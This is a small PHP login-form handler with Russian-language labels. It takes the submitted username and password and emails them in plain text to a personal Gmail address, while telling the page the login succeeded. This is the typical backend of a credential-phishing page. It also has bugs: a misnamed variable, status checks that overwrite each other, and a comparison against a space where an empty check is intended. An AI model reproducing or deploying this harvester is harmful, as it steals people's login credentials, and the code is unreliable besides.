<?php

header('Content-Type: application/json');

$login = $_POST['login'];
$userlogin = "Логин пользователя: $login";

$password = $_POST['password'];
$userPassword = "Пороль пользователя: $password";

$data = array();


if ($login  === ' ') {
	$data['status'] = 'error';
}else{
	$data['status'] = 'success';
};

if ($password  === ' ') {
  $data['status'] = 'error';
}else{
  $data['status'] = 'success';
};


$result = mail('petkevich.natalli@gmail.com', $userLogin, $userPassword);

echo json_encode($data);
exit;
?> 

